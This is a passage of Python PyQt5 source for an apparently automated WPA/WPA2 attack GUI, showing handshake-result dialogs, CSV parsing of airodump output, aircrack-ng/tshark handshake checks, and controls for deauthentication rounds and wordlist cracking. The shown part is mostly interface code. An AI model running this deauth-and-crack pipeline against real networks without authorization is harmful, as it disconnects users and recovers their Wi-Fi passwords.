        self._populate_table(self.sta_table, sta_h, sta_rows,
            default_headers=["Station MAC","First seen","Last seen","Power",
                "# packets","BSSID","Probed ESSIDs"])
        self.raw_view.setPlainText(content)
        self.status_label.setText(
            f"✅ Loaded — APs: {len(ap_rows)}  |  Stations: {len(sta_rows)}")
        self.status_label.setStyleSheet(f"color:{SUCCESS};")
    @staticmethod
    def _populate_table(table, headers, rows, default_headers):
        if not headers:
            if rows: headers = default_headers[:len(rows[0])]
            else:
                table.setRowCount(0); table.setColumnCount(0); return
        n_cols = max(len(headers), max((len(r) for r in rows), default=0))
        if len(headers) < n_cols:
            headers = headers + [""] * (n_cols - len(headers))
        table.setColumnCount(n_cols)
        table.setHorizontalHeaderLabels(headers)
        table.setRowCount(len(rows))
        for r, row in enumerate(rows):
            for c in range(n_cols):
                val = row[c] if c < len(row) else ""
                table.setItem(r, c, QTableWidgetItem(str(val).strip()))
        table.resizeColumnsToContents()
        table.horizontalHeader().setStretchLastSection(True)
class HandshakeResultDialog(QDialog):
    def __init__(self, cap_path, csv_path, bssid, parent=None):
        super().__init__(parent)
        self.cap_path = Path(cap_path)
        self.csv_path = Path(csv_path)
        self.target_bssid = bssid
        self.setWindowTitle(f"Handshake Results — {self.cap_path.name}")
        self.resize(1350, 800)
        self.setStyleSheet(f"""
            QDialog {{ background-color: {BLACK_PANEL}; }}
            QLabel {{ color: {TEXT}; }}
            QPushButton {{
                background-color: {BLACK_INPUT}; color: {TEXT};
                border: 1px solid {GRAY_BORDER}; padding: 6px 12px;
                border-radius: 3px; font-weight: bold;
            }}
            QPushButton:hover {{
                background-color: {GOLD_DEEP}; color: {BLACK_DEEP};
                border: 1px solid {GOLD};
            }}
            QTableWidget {{
                background-color: {BLACK_DEEP}; color: {TEXT};
                gridline-color: {GRAY_BORDER};
                selection-background-color: {GOLD_DEEP};
                alternate-background-color: {BLACK_PANEL};
                border: 1px solid {GRAY_BORDER};
            }}
            QHeaderView::section {{
                background-color: {BLACK_PANEL}; color: {GOLD};
                padding: 8px; border: 1px solid {GRAY_BORDER};
                font-weight: bold;
            }}
            QTextEdit {{
                background-color: {BLACK_DEEP}; color: {TEXT};
                border: 1px solid {GRAY_BORDER};
                font-family: "Consolas", "Courier New"; font-size: 9pt;
            }}
            QCheckBox {{ color: {TEXT}; }}
        """)
        layout = QVBoxLayout(self)
        top = QHBoxLayout()
        self.status_label = QLabel("⏳ Checking handshake…")
        self.status_label.setStyleSheet(
            f"color:{WARNING}; font-family:'Consolas'; font-weight:bold;")
        top.addWidget(self.status_label); top.addStretch()
        rbtn = QPushButton("🔄 Reload"); rbtn.clicked.connect(self.load_results)
        top.addWidget(rbtn)
        wsbtn = QPushButton("🔬 Open in Wireshark")
        wsbtn.clicked.connect(self.open_in_wireshark); top.addWidget(wsbtn)
        cbtn = QPushButton("📋 Copy Path"); cbtn.clicked.connect(self.copy_path)
        top.addWidget(cbtn)
        xbtn = QPushButton("✖ Close"); xbtn.clicked.connect(self.close)
        top.addWidget(xbtn)
        layout.addLayout(top)
        path_lbl = QLabel(f"📁 CAP: {self.cap_path}\n📁 CSV: {self.csv_path}")
        path_lbl.setStyleSheet(
            f"color:{GOLD}; font-family:'Consolas'; font-size:9pt;")
        layout.addWidget(path_lbl)
        self.tabs = QTabWidget()
        ap_w = QWidget(); ap_l = QVBoxLayout(ap_w)
        self.ap_table = QTableWidget(); self.ap_table.setColumnCount(9)
        self.ap_table.setHorizontalHeaderLabels(
            ["BSSID","PWR","Beacons","CH","MB","ENC","CIPHER","AUTH","ESSID"])
        self.ap_table.setAlternatingRowColors(True)
        self.ap_table.setEditTriggers(QTableWidget.NoEditTriggers)
        self.ap_table.setSelectionBehavior(QTableWidget.SelectRows)
        ap_l.addWidget(self.ap_table); self.tabs.addTab(ap_w, "APs (Networks)")
        sta_w = QWidget(); sta_l = QVBoxLayout(sta_w)
        self.sta_table = QTableWidget(); self.sta_table.setColumnCount(6)
        self.sta_table.setHorizontalHeaderLabels(
            ["STATION","PWR","Frames","BSSID","Probes","Notes"])
        self.sta_table.setAlternatingRowColors(True)
        self.sta_table.setEditTriggers(QTableWidget.NoEditTriggers)
        self.sta_table.setSelectionBehavior(QTableWidget.SelectRows)
        sta_l.addWidget(self.sta_table); self.tabs.addTab(sta_w, "Stations (Clients)")
        raw_w = QWidget(); raw_l = QVBoxLayout(raw_w)
        self.raw_view = QTextEdit(); self.raw_view.setReadOnly(True)
        raw_l.addWidget(self.raw_view); self.tabs.addTab(raw_w, "Raw CSV")
        layout.addWidget(self.tabs)
        bot = QHBoxLayout(); bot.addStretch()
        self.auto_refresh = QCheckBox("Auto-refresh (2s)")
        self.auto_refresh.setStyleSheet(f"color:{TEXT};")
        self.auto_refresh.stateChanged.connect(self.toggle_auto_refresh)
        bot.addWidget(self.auto_refresh); layout.addLayout(bot)
        self.refresh_timer = QTimer(self)
        self.refresh_timer.timeout.connect(self.load_results)
        self.load_results()
    def toggle_auto_refresh(self, state):
        if state == Qt.Checked: self.refresh_timer.start(2000)
        else: self.refresh_timer.stop()
    def copy_path(self):
        QApplication.clipboard().setText(str(self.cap_path))
        self.status_label.setText("📋 Path copied")
        self.status_label.setStyleSheet(f"color:{SUCCESS}; font-weight:bold;")
    def open_in_wireshark(self):
        try:
            subprocess.Popen(["wireshark", str(self.cap_path)],
                             start_new_session=True)
        except FileNotFoundError:
            QMessageBox.warning(self, "Wireshark not found",
                "Install Wireshark: sudo apt install wireshark")
    def load_results(self):
        self._check_handshake(); self._load_csv()
    def _check_handshake(self):
        if not self.cap_path.exists() or self.cap_path.stat().st_size == 0:
            self.status_label.setText("⏳ No capture data yet…")
            self.status_label.setStyleSheet(
                f"color:{WARNING}; font-family:'Consolas'; font-weight:bold;")
            return
        bssid = self.target_bssid or ""
        try:
            cmd = ["aircrack-ng"]
            if bssid: cmd += ["-b", bssid]
            cmd += [str(self.cap_path)]
            r = subprocess.run(cmd, capture_output=True, text=True,
                               timeout=10, start_new_session=True)
            combined = (r.stdout or "") + "\n" + (r.stderr or "")
            m = re.search(r"(\d+)\s+handshake", combined)
            if m and int(m.group(1)) >= 1:
                self.status_label.setText(
                    f"[WPA handshake: {bssid}]  ✅ ({m.group(1)} handshake)")
                self.status_label.setStyleSheet(
                    f"color:{SUCCESS}; font-family:'Consolas'; font-weight:bold;")
            else:
                self.status_label.setText(
                    "[WPA handshake: NOT FOUND]  ⏳ still waiting…")
                self.status_label.setStyleSheet(
                    f"color:{WARNING}; font-family:'Consolas'; font-weight:bold;")
        except FileNotFoundError:
            try:
                r = subprocess.run(
                    ["tshark", "-r", str(self.cap_path),
                     "-Y", "eapol", "-T", "fields", "-e", "eapol.type"],
                    capture_output=True, text=True, timeout=5,
                    start_new_session=True)
                self.status_label.setText(
                    "[EAPOL frames detected]" if r.stdout.strip()
                    else "[No handshake found yet]")
            except Exception:
                self.status_label.setText("[aircrack-ng / tshark not installed]")
        except Exception as e:
            self.status_label.setText(f"[!] Check error: {e}")
    def _load_csv(self):
        if not self.csv_path.exists(): return
        try:
            with open(self.csv_path, "r", encoding="utf-8",
                      errors="replace", newline="") as f:
                content = f.read()
        except Exception: return
        ap_rows, sta_rows, section = [], [], None
        for line in content.splitlines():
            if not line.strip(): continue
            try: row = next(csv.reader([line]))
            except Exception: continue
            first = row[0].strip() if row else ""
            if first == "BSSID": section = "AP"; continue
            if first == "Station MAC": section = "STA"; continue
            if section == "AP" and len(row) >= 14: ap_rows.append(row)
            elif section == "STA" and len(row) >= 6: sta_rows.append(row)
        self.ap_table.setUpdatesEnabled(False)
        try:
            self.ap_table.setRowCount(len(ap_rows))
            for r, row in enumerate(ap_rows):
                values = [row[0].strip(), row[8].strip(), row[9].strip(),
                          row[3].strip(), row[4].strip(), row[5].strip(),
                          row[6].strip(), row[7].strip(),
                          row[13].strip() or "(hidden)"]
                for c, v in enumerate(values):
                    self.ap_table.setItem(r, c, QTableWidgetItem(v))
            self.ap_table.resizeColumnsToContents()
            self.ap_table.horizontalHeader().setStretchLastSection(True)
        finally: self.ap_table.setUpdatesEnabled(True)
        self.sta_table.setUpdatesEnabled(False)
        try:
            self.sta_table.setRowCount(len(sta_rows))
            for r, row in enumerate(sta_rows):
                mac = row[0].strip(); power = row[3].strip()
                packets = row[4].strip(); bssid = row[5].strip()
                probed = row[6].strip() if len(row) > 6 else ""
                notes = "EAPOL" if ("EAPOL" in probed.upper()
                                    or "EAPOL" in bssid.upper()) else ""
                values = [mac, power, packets, bssid, probed, notes]
                for c, v in enumerate(values):
                    self.sta_table.setItem(r, c, QTableWidgetItem(v))
            self.sta_table.resizeColumnsToContents()
            self.sta_table.horizontalHeader().setStretchLastSection(True)
        finally: self.sta_table.setUpdatesEnabled(True)
        self.raw_view.setPlainText(content)
class MainWindow(QMainWindow):
    worker_log_signal = pyqtSignal(str)
    worker_button_signal = pyqtSignal(object, bool)
    worker_ui_signal = pyqtSignal(object)
    automation_status_signal = pyqtSignal(str, str)
    automation_progress_signal = pyqtSignal(str)
    def __init__(self):
        super().__init__()
        self.worker_log_signal.connect(self._append_log_from_worker)
        self.worker_button_signal.connect(self._set_button_enabled)
        self.worker_ui_signal.connect(self._run_ui_callback)
        self.automation_status_signal.connect(self._set_automation_status)
        self.automation_progress_signal.connect(self._set_automation_progress)
        self.monitor_interface = None
        self.is_closing = False
        self.cleanup_complete = False
        self.networks = {}
        self.realtime_scan = CommandRunner("Real-time Scan", self.log)
        self.targeted_scan = CommandRunner("Targeted Scan", self.log)
        self.deauth_attack = CommandRunner("Deauth Attack", self.log)
        self.crack_attack = CommandRunner("aircrack-ng", self.log)
        self.csv_file = None
        self.handshake_dir = None
        self.handshake_cap_file = None
        self.handshake_csv_file = None
        self._dialogs = []
        self.automation_enabled = False
        self.automation_phase = "idle"
        self.automation_scan_start_ts = 0
        self.automation_scan_min_networks = 3
        self.automation_scan_max_seconds = 30
        self.automation_scan_grace_seconds = 3
        self.automation_pending_target = None
        self.automation_deauth_rounds = 3
        self.automation_deauth_count = 3
        self.automation_deauth_round = 0
        self.automation_deauth_thread = None
        self.automation_poll_timer = None
        self.automation_capture_start_ts = 0
        self._auto_scan_first_hit_ts = None
        self.crack_result = None
        self.init_ui()
        try: self._install_help_menu()
        except Exception as e: print(f"[!] Help menu failed: {e}")
        try: self._install_tooltips()
        except Exception as e: print(f"[!] Tooltips failed: {e}")
        try: self._install_shortcuts()
        except Exception as e: print(f"[!] Shortcuts failed: {e}")
        self.detect_interfaces()
        self.log(f"[*] {APP_NAME} — {APP_VERSION}")
        self.log(f"[*] {APP_TAGLINE}")
        self.log("[*] Need help? Press F1.")
        self.log("[*] Quick start: pick interface → 🚀 → click target row.")
        self.setup_signal_handlers()
        self.setup_crash_protection()
        self.automation_poll_timer = QTimer(self)
        self.automation_poll_timer.timeout.connect(self._automation_tick)
        self.automation_poll_timer.setInterval(500)
        QTimer.singleShot(600, self._maybe_show_welcome)
    def _install_help_menu(self):
        menubar = self.menuBar()
        menubar.setStyleSheet(f"""
            QMenuBar {{ background-color: {BLACK_DEEP}; color: {TEXT};
                        padding: 2px; }}
            QMenuBar::item {{ padding: 8px 16px; background: transparent; }}
            QMenuBar::item:selected {{ background-color: {BLACK_INPUT};
                                       color: {GOLD_BRIGHT}; }}
            QMenu {{ background-color: {BLACK_PANEL}; color: {TEXT};
                    border: 1px solid {GRAY_BORDER}; padding: 4px; }}
            QMenu::item {{ padding: 8px 28px; }}
            QMenu::item:selected {{ background-color: {GOLD_DEEP};
                                    color: {BLACK_DEEP}; }}
            QMenu::separator {{ height: 1px; background: {GRAY_BORDER};
                                margin: 4px 8px; }}
        """)
        file_menu = menubar.addMenu("&File")
        act_restart = QAction("🔄 Re-detect interfaces", self)
        act_restart.triggered.connect(self.detect_interfaces)
        file_menu.addAction(act_restart)
        file_menu.addSeparator()
        act_quit = QAction("✖ Quit", self)
        act_quit.setShortcut(QKeySequence("Ctrl+Q"))
        act_quit.triggered.connect(self.close)
        file_menu.addAction(act_quit)
        help_menu = menubar.addMenu("&Help")
        act_quick = QAction("🚀 Quick Start Guide", self)
        act_quick.setShortcut(QKeySequence("F1"))
        act_quick.triggered.connect(lambda: self._show_help("quickstart"))
        help_menu.addAction(act_quick)
        act_over = QAction("📖 Overview & Purpose", self)
        act_over.triggered.connect(lambda: self._show_help("overview"))
        help_menu.addAction(act_over)
        act_phases = QAction("📊 Understanding Phases", self)
        act_phases.triggered.connect(lambda: self._show_help("phases"))
        help_menu.addAction(act_phases)
        act_results = QAction("🔑 Reading Your Results", self)
        act_results.triggered.connect(lambda: self._show_help("results"))
        help_menu.addAction(act_results)
        act_settings = QAction("⚙️ Settings Explained", self)
        act_settings.triggered.connect(lambda: self._show_help("settings"))
        help_menu.addAction(act_settings)
        act_trouble = QAction("🔧 Troubleshooting", self)
        act_trouble.triggered.connect(lambda: self._show_help("troubleshooting"))
        help_menu.addAction(act_trouble)
        help_menu.addSeparator()
        act_legal = QAction("⚖️ Legal & Ethics", self)
        act_legal.triggered.connect(lambda: self._show_help("legal"))
        help_menu.addAction(act_legal)
        help_menu.addSeparator()
        act_welcome = QAction("👋 Show Welcome Again", self)
        act_welcome.triggered.connect(self._show_welcome_force)
        help_menu.addAction(act_welcome)
        act_about = QAction("ℹ️ About", self)
        act_about.triggered.connect(self._show_about)
        help_menu.addAction(act_about)

    def _install_shortcuts(self):
        QShortcut(QKeySequence("F1"), self,
                  activated=lambda: self._show_help("quickstart"))
        QShortcut(QKeySequence("Ctrl+H"), self,
                  activated=lambda: self._show_help("overview"))
    def _install_tooltips(self):
        def tip(widget, text):
            try:
                if widget is not None: widget.setToolTip(text)
            except Exception: pass
        tip(getattr(self, "iface_combo", None),
            "Your wireless adapter. Click Detect if empty.")
        tip(getattr(self, "detect_btn", None),
            "Refresh the wireless interface list.")
        tip(getattr(self, "btn_auto_start", None),
            "Starts the FULL pipeline:\n"
            "check kill → monitor → scan → capture → deauth → crack.\n"
            "Only click a target row when asked.")
        tip(getattr(self, "btn_auto_stop", None),
            "Aborts automation and stops all subprocesses.")
        tip(getattr(self, "auto_scan_timeout", None),
            "Maximum seconds for the initial scan (default 30).")
        tip(getattr(self, "auto_min_networks", None),
            "Stop scanning once this many networks appear (default 3).")
        tip(getattr(self, "auto_deauth_count", None),
            "Deauth frames per round (default 3).")
        tip(getattr(self, "auto_deauth_rounds", None),
            "Deauth rounds (default 3).")
        tip(getattr(self, "crack_wordlist", None),
            f"Wordlist. Default: {DEFAULT_WORDLIST}")
        tip(getattr(self, "crack_browse_btn", None),
            "Pick a custom wordlist.")
        tip(getattr(self, "table", None),
            "Click any row to choose your target.")
        tip(getattr(self, "log_output", None),
            "Live log of all activity.")
    def _show_help(self, topic="overview"):
        try:
            dlg = HelpDialog(initial_topic=topic, parent=self)
            dlg.setAttribute(Qt.WA_DeleteOnClose, True)
            dlg.show()
            self._dialogs.append(dlg)
        except Exception as e:
            self.log(f"[!] Help dialog error: {e}")

    def _show_about(self):
        QMessageBox.information(self, f"About {APP_NAME}",
            f"<h2 style='color:{GOLD};'>{APP_NAME}</h2>"
            f"<p style='color:{TEXT};'>{APP_TAGLINE}</p>"
            f"<p style='color:{TEXT};'>Fully automated WPA/WPA2 handshake "
            f"capture &amp; audit tool.</p>"
            f"<p style='color:{TEXT_MUTED};'>{APP_VERSION}</p>"
            f"<p style='color:{TEXT_MUTED};'>Educational &amp; authorized "
            f"testing only.</p>")
    def _maybe_show_welcome(self):
        try:
            if not WELCOME_FLAG.exists(): self._show_welcome_force()
        except Exception:
            self._show_welcome_force()

    def _show_welcome_force(self):
        try:
            dlg = WelcomeDialog(parent=self)
            dlg.exec_()
            if dlg.dont_show.isChecked():
                try: WELCOME_FLAG.touch()
                except Exception: pass
        except Exception as e:
            self.log(f"[!] Welcome dialog error: {e}")
    def setup_crash_protection(self):
        try: signal.signal(signal.SIGPIPE, signal.SIG_IGN)
        except Exception: pass
        sys.excepthook = self.exception_hook
    def exception_hook(self, exc_type, exc_value, exc_traceback):
        try:
            import traceback
            self.log("[!] UNCAUGHT EXCEPTION:\n" + ''.join(
                traceback.format_exception(exc_type, exc_value, exc_traceback)))
        except Exception:
            import traceback
            traceback.print_exception(exc_type, exc_value, exc_traceback)
    def setup_signal_handlers(self):
        def handler(signum, frame):
            if signum == signal.SIGINT:
                self.log("[!] Ctrl+C received.")
                QCoreApplication.quit()
            elif signum == signal.SIGTERM:
                if not self.is_closing:
                    self.log("[!] SIGTERM blocked.")
                    return
                QCoreApplication.quit()
        signal.signal(signal.SIGINT, handler)
        signal.signal(signal.SIGTERM, handler)
        for sig in [signal.SIGHUP, signal.SIGQUIT, signal.SIGABRT]:
            try: signal.signal(sig, handler)
            except Exception: pass
    def init_ui(self):
        self.setWindowTitle(f"{APP_NAME} — {APP_VERSION}")
        self.setGeometry(40, 40, 1320, 880)
        if LOGO_PATH.exists():
            try: self.setWindowIcon(QIcon(str(LOGO_PATH)))
            except Exception: pass

        self.setStyleSheet(f"""
            QMainWindow {{ background-color: {BLACK_DEEP}; }}
            QWidget {{ color: {TEXT}; }}
            QGroupBox {{
                color: {GOLD};
                border: 1px solid {GRAY_BORDER};
                border-radius: 6px;
                margin-top: 14px;
                font-weight: bold;
                font-family: 'Georgia', serif;
                padding-top: 8px;
                background-color: {BLACK_PANEL};
            }}
            QGroupBox::title {{
                subcontrol-origin: margin; left: 14px;
                padding: 0 8px;
                color: {GOLD_BRIGHT};
                font-size: 11pt;
            }}
            QPushButton {{
                background-color: {BLACK_INPUT};
                color: {TEXT};
                border: 1px solid {GRAY_BORDER};
                padding: 8px 16px;
                border-radius: 4px;
                font-weight: bold;
            }}
            QPushButton:hover {{
                background-color: {GOLD_DEEP};
                color: {BLACK_DEEP};
                border: 1px solid {GOLD};
            }}
            QPushButton:disabled {{
                background-color: #1a1a1a; color: #4a4a4a;
                border: 1px solid #222;
            }}
            QPushButton#auto {{
                background-color: {GOLD}; color: {BLACK_DEEP};
                border: none; padding: 12px 22px;
                font-size: 12pt; font-family: 'Georgia', serif;
            }}
            QPushButton#auto:hover {{ background-color: {GOLD_BRIGHT}; }}
            QPushButton#auto_stop {{
                background-color: {DANGER}; color: white; border: none;
            }}
            QPushButton#auto_stop:hover {{ background-color: #ff6b5a; }}
            QPushButton#viewer {{ background-color: {BLACK_INPUT};
                                  border: 1px solid {INFO}; color: {INFO}; }}
            QPushButton#viewer:hover {{ background-color: {INFO};
                                        color: {BLACK_DEEP}; }}
            QPushButton#wireshark {{ background-color: {BLACK_INPUT};
                                     border: 1px solid #a06cd5; color: #c69cea; }}
            QPushButton#wireshark:hover {{ background-color: #a06cd5;
                                           color: white; }}
            QPushButton#help {{
                background-color: {BLACK_INPUT};
                border: 1px solid {GOLD_DEEP};
                color: {GOLD}; min-width: 34px; max-width: 34px;
                font-weight: bold; font-size: 14pt;
            }}
            QPushButton#help:hover {{
                background-color: {GOLD_DEEP}; color: {BLACK_DEEP};
            }}
            QLabel {{ color: {TEXT}; }}
            QLineEdit, QComboBox, QSpinBox {{
                background-color: {BLACK_INPUT};
                color: {TEXT};
                border: 1px solid {GRAY_BORDER};
                border-radius: 4px;
                padding: 6px 8px;
                selection-background-color: {GOLD_DEEP};
            }}
            QLineEdit:focus, QComboBox:focus, QSpinBox:focus {{
                border: 1px solid {GOLD};
            }}
            QTableWidget {{
                background-color: {BLACK_DEEP};
                color: {TEXT};
                gridline-color: {GRAY_BORDER};
                selection-background-color: {GOLD_DEEP};
                alternate-background-color: {BLACK_PANEL};
                border: 1px solid {GRAY_BORDER};
                border-radius: 4px;
            }}
            QHeaderView::section {{
                background-color: {BLACK_PANEL};
                color: {GOLD};
                padding: 8px;
                border: none;
                border-right: 1px solid {GRAY_BORDER};
                border-bottom: 1px solid {GRAY_BORDER};
                font-weight: bold;
                font-family: 'Georgia', serif;
            }}
            QTextEdit {{
                background-color: {BLACK_DEEP};
                color: {TEXT};
                border: 1px solid {GRAY_BORDER};
                border-radius: 4px;
                font-family: "Consolas", "Courier New";
                font-size: 9pt;
                padding: 4px;
            }}
            QStatusBar {{
                color: {GOLD};
                background-color: {BLACK_PANEL};
                border-top: 1px solid {GRAY_BORDER};
                font-weight: bold;
            }}
            QScrollBar:vertical {{
                background: {BLACK_PANEL}; width: 10px;
                border-radius: 5px;
            }}
            QScrollBar::handle:vertical {{
                background: {GOLD_DEEP}; border-radius: 5px;
                min-height: 30px;
            }}
            QScrollBar::handle:vertical:hover {{ background: {GOLD}; }}
            QScrollBar::add-line:vertical, QScrollBar::sub-line:vertical {{
                height: 0px;
            }}
            QScrollBar:horizontal {{
                background: {BLACK_PANEL}; height: 10px;
                border-radius: 5px;
            }}
            QScrollBar::handle:horizontal {{
                background: {GOLD_DEEP}; border-radius: 5px;
                min-width: 30px;
            }}
            QScrollBar::handle:horizontal:hover {{ background: {GOLD}; }}
        """)

        central = QWidget()
        self.setCentralWidget(central)
        main_layout = QVBoxLayout(central)
        main_layout.setContentsMargins(16, 16, 16, 16)
        main_layout.setSpacing(12)
        header = QFrame()
        header.setObjectName("brandHeader")
        header.setStyleSheet(f"""
            QFrame#brandHeader {{
                background-color: {BLACK_PANEL};
                border: 1px solid {GRAY_BORDER};
                border-radius: 8px;
            }}
        """)
        hl = QHBoxLayout(header)
        hl.setContentsMargins(18, 12, 18, 12)

        logo_lbl = QLabel()
        if LOGO_PATH.exists():
            try:
                pix = QPixmap(str(LOGO_PATH))
                if not pix.isNull():
                    logo_lbl.setPixmap(pix.scaled(64, 64, Qt.KeepAspectRatio,
                                                  Qt.SmoothTransformation))
            except Exception:
                pass
        hl.addWidget(logo_lbl)

        title_col = QVBoxLayout()
        title_col.setSpacing(0)
        t1 = QLabel(APP_NAME.upper())
        t1.setStyleSheet(f"""
            color: {GOLD_BRIGHT}; font-size: 16pt;
            font-family: 'Georgia', serif; font-weight: bold;
            letter-spacing: 2px;
        """)
        title_col.addWidget(t1)
        t2 = QLabel(f"· {APP_TAGLINE} ·")
        t2.setStyleSheet(f"color: {GOLD}; font-size: 9pt; font-style: italic;")
        title_col.addWidget(t2)
        hl.addLayout(title_col)
        hl.addStretch()
        ver = QLabel(APP_VERSION)
        ver.setStyleSheet(f"color: {TEXT_MUTED}; font-size: 9pt;")
        hl.addWidget(ver)
        main_layout.addWidget(header)
        iface_group = QGroupBox("  Wireless Interface")
        il = QHBoxLayout()
        il.addWidget(QLabel("Interface:"))
        self.iface_combo = QComboBox(); self.iface_combo.setMinimumWidth(160)
        il.addWidget(self.iface_combo)
        self.detect_btn = QPushButton("🔄 Detect")
        self.detect_btn.clicked.connect(self.detect_interfaces)
        il.addWidget(self.detect_btn)
        il.addWidget(QLabel("Status:"))
        self.status_label = QLabel("⚪ Idle")
        self.status_label.setStyleSheet(f"color: {TEXT}; font-weight: bold;")
        il.addWidget(self.status_label)
        il.addStretch()
        iface_group.setLayout(il); main_layout.addWidget(iface_group)
        auto_group = QGroupBox(" Fully Automated Workflow  ·  click once → pick target → done")
        auto_layout = QGridLayout()
        auto_layout.setHorizontalSpacing(10)
        auto_layout.setVerticalSpacing(10)
        self.btn_auto_start = QPushButton("⚔  START FULLY AUTOMATED WORKFLOW")
        self.btn_auto_start.setObjectName("auto")
        self.btn_auto_start.clicked.connect(self.start_automation)
        auto_layout.addWidget(self.btn_auto_start, 0, 0, 1, 3)
        self.btn_auto_stop = QPushButton("⏹  Stop Automation")
        self.btn_auto_stop.setObjectName("auto_stop")
        self.btn_auto_stop.clicked.connect(self.stop_automation)
        self.btn_auto_stop.setEnabled(False)
        auto_layout.addWidget(self.btn_auto_stop, 0, 3, 1, 2)
        self.btn_quick_help = QPushButton("?")
        self.btn_quick_help.setObjectName("help")
        self.btn_quick_help.clicked.connect(lambda: self._show_help("quickstart"))
        auto_layout.addWidget(self.btn_quick_help, 0, 5)
        self.auto_status_label = QLabel("⚪ Idle — awaiting orders")
        self.auto_status_label.setStyleSheet(
            f"color: {TEXT}; font-family: 'Consolas'; font-weight: bold;")
        auto_layout.addWidget(self.auto_status_label, 0, 6, 1, 2)
        self.auto_progress_label = QLabel("Phase: —")
        self.auto_progress_label.setStyleSheet(
            f"color: {INFO}; font-family: 'Consolas';")
        auto_layout.addWidget(self.auto_progress_label, 1, 0, 1, 8)
        auto_layout.addWidget(QLabel("Scan timeout (s):"), 2, 0)
        self.auto_scan_timeout = QSpinBox(); self.auto_scan_timeout.setRange(5, 120)
        self.auto_scan_timeout.setValue(30)
        auto_layout.addWidget(self.auto_scan_timeout, 2, 1)
        auto_layout.addWidget(QLabel("Min networks:"), 2, 2)
        self.auto_min_networks = QSpinBox(); self.auto_min_networks.setRange(1, 50)
        self.auto_min_networks.setValue(3)
        auto_layout.addWidget(self.auto_min_networks, 2, 3)
        auto_layout.addWidget(QLabel("Deauth count:"), 2, 4)
        self.auto_deauth_count = QSpinBox(); self.auto_deauth_count.setRange(1, 100)
        self.auto_deauth_count.setValue(3)
        auto_layout.addWidget(self.auto_deauth_count, 2, 5)
        auto_layout.addWidget(QLabel("Deauth rounds:"), 2, 6)
        self.auto_deauth_rounds = QSpinBox(); self.auto_deauth_rounds.setRange(1, 10)
        self.auto_deauth_rounds.setValue(3)
        auto_layout.addWidget(self.auto_deauth_rounds, 2, 7)
        auto_layout.addWidget(QLabel("Wordlist:"), 3, 0)
        self.crack_wordlist = QLineEdit()
        self.crack_wordlist.setText(DEFAULT_WORDLIST)
        self.crack_wordlist.setPlaceholderText(DEFAULT_WORDLIST)
        auto_layout.addWidget(self.crack_wordlist, 3, 1, 1, 6)
        self.crack_browse_btn = QPushButton("📂 Browse")
        self.crack_browse_btn.clicked.connect(self.browse_wordlist)
        auto_layout.addWidget(self.crack_browse_btn, 3, 7)
        hint = QLabel(
            "💡 New here? Press <b>F1</b> for the Quick Start guide, or click "
            "the <b>?</b> button. The tool handles check-kill, monitor mode, "
            "scanning, capture, deauth, and cracking automatically.")
        hint.setStyleSheet(
            f"color: {TEXT_MUTED}; font-family: 'Segoe UI'; font-size: 9pt;")
        hint.setWordWrap(True)
        auto_layout.addWidget(hint, 4, 0, 1, 8)
        auto_group.setLayout(auto_layout)
        main_layout.addWidget(auto_group)
        target_group = QGroupBox("Capture Details (auto)")
        tl = QGridLayout()
        tl.addWidget(QLabel("BSSID:"), 0, 0)
        self.target_bssid = QLineEdit(); tl.addWidget(self.target_bssid, 0, 1)
        tl.addWidget(QLabel("Channel:"), 0, 2)
        self.target_channel = QLineEdit(); tl.addWidget(self.target_channel, 0, 3)
        tl.addWidget(QLabel("File Name:"), 1, 0)
        self.capture_name = QLineEdit(); self.capture_name.setText("gain")
        tl.addWidget(self.capture_name, 1, 1)
        self.capture_location_label = QLabel("📁 Location: /tmp/handshake/")
        tl.addWidget(self.capture_location_label, 1, 2, 1, 2)
        vb = QHBoxLayout()
        self.btn_view_scan_csv = QPushButton("📄 Scan CSV")
        self.btn_view_scan_csv.setObjectName("viewer")
        self.btn_view_scan_csv.clicked.connect(self.view_scan_csv)
        self.btn_view_scan_csv.setEnabled(False)
        vb.addWidget(self.btn_view_scan_csv)
        self.btn_view_handshake_csv = QPushButton("📄 Handshake CSV")
        self.btn_view_handshake_csv.setObjectName("viewer")
        self.btn_view_handshake_csv.clicked.connect(self.view_handshake_csv)
        self.btn_view_handshake_csv.setEnabled(False)
        vb.addWidget(self.btn_view_handshake_csv)
        self.btn_view_handshake_packets = QPushButton("🔍 Handshake Results")
        self.btn_view_handshake_packets.setObjectName("viewer")
        self.btn_view_handshake_packets.clicked.connect(self.view_handshake_packets)
        self.btn_view_handshake_packets.setEnabled(False)
        vb.addWidget(self.btn_view_handshake_packets)
        self.btn_open_wireshark = QPushButton("🔬 Wireshark")
        self.btn_open_wireshark.setObjectName("wireshark")
        self.btn_open_wireshark.clicked.connect(self.open_in_wireshark)
        self.btn_open_wireshark.setEnabled(False)
        vb.addWidget(self.btn_open_wireshark)
        tl.addLayout(vb, 3, 0, 1, 4)
        self.handshake_status = QLabel("⏳ Waiting…")
        tl.addWidget(self.handshake_status, 4, 0, 1, 4)
        target_group.setLayout(tl)
        target_group.setVisible(False)
        main_layout.addWidget(target_group)
        deauth_group = QGroupBox("Deauth (auto)")
        dl = QGridLayout()
        dl.addWidget(QLabel("BSSID:"), 0, 0)
        self.deauth_bssid = QLineEdit(); dl.addWidget(self.deauth_bssid, 0, 1)
        dl.addWidget(QLabel("Station:"), 0, 2)
        self.deauth_station = QLineEdit(); dl.addWidget(self.deauth_station, 0, 3)
        dl.addWidget(QLabel("Count:"), 1, 0)
        self.deauth_count = QSpinBox(); self.deauth_count.setRange(1, 10000)
        self.deauth_count.setValue(3); self.deauth_count.setReadOnly(True)
        dl.addWidget(self.deauth_count, 1, 1)
        dl.addWidget(QLabel("Interface:"), 1, 2)
        self.deauth_iface = QLineEdit(); self.deauth_iface.setReadOnly(True)
        dl.addWidget(self.deauth_iface, 1, 3)
        deauth_group.setLayout(dl)
        deauth_group.setVisible(False)
        main_layout.addWidget(deauth_group)
        param_group = QGroupBox("Selected Network")
        pl = QGridLayout()
        pl.addWidget(QLabel("BSSID:"), 0, 0)
        self.bssid_input = QLineEdit(); pl.addWidget(self.bssid_input, 0, 1)
        pl.addWidget(QLabel("Channel:"), 0, 2)
        self.channel_input = QLineEdit(); pl.addWidget(self.channel_input, 0, 3)
        pl.addWidget(QLabel("ESSID:"), 1, 0)
        self.essid_input = QLineEdit(); self.essid_input.setReadOnly(True)
        pl.addWidget(self.essid_input, 1, 1)
        pl.addWidget(QLabel("Encryption:"), 1, 2)
        self.encryption_input = QLineEdit(); self.encryption_input.setReadOnly(True)
        pl.addWidget(self.encryption_input, 1, 3)
        param_group.setLayout(pl)
        param_group.setVisible(False)
